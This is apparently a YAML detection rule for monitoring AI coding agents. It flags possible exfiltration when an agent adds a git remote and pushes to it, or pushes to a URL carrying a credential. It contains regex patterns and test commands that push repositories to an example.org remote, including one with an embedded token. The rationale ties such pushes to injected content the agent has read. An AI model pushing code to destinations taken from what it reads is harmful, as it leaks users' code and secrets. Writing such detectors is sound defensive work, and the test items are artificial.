id: AFX-EXFILINDICATORS-003
pack: exfil_indicators
title: A command pushed to a git remote the agent had just added
severity: medium
description: >
  Within one event the agent both added or set a git remote and pushed to it, or pushed to
  a remote whose URL carries an embedded credential.
rationale: >
  Pushing code is what a coding agent does, so a push on its own says nothing. A push to a
  remote that did not exist a moment earlier is different: it means the destination came
  from the conversation rather than from the repository's own configuration, and a
  destination that came from the conversation could have come from anywhere in it,
  including from content the agent read rather than from the user.
applies_to:
  kinds: [command.exec]
match:
  any:
    - field: payload.commands[].command
      regex: '\bgit\b[^;&|]*\bremote\b[^;&|]*\b(?:add|set-url)\b[\s\S]{0,400}?\bgit\b[^;&|]*\bpush\b'
    - field: payload.commands[].command
      regex: '\bgit\b[^;&|]*\bpush\b[^;&|]*https?://[^\s/@]+:[^\s/@]+@'
tags:
  - T1567
  - exfiltration
false_positives:
  - >-
    A fork workflow, where adding a second remote and pushing to it in one go is the normal
    way to do the work.
  - >-
    A setup script that configures a remote and pushes an initial commit, which is exactly
    this shape and entirely routine.
tests:
  - name: a remote added and pushed to in one command
    match: true
    event:
      kind: command.exec
      agent: claude_code
      payload:
        commands: [{command: "git remote add backup https://example.org/a/b.git && git push backup --all"}]
  - name: a push to a URL carrying a credential
    match: true
    event:
      kind: command.exec
      agent: codex
      payload:
        commands: [{command: "git push https://alice:t0ken@example.org/a/b.git main"}]
  - name: an ordinary push to the configured remote
    match: false
    event:
      kind: command.exec
      agent: claude_code
      payload:
        commands: [{command: "git push origin main"}]
  - name: a remote added without a push
    match: false
    event:
      kind: command.exec
      agent: claude_code
      payload:
        commands: [{command: "git remote add upstream https://example.org/a/b.git"}]
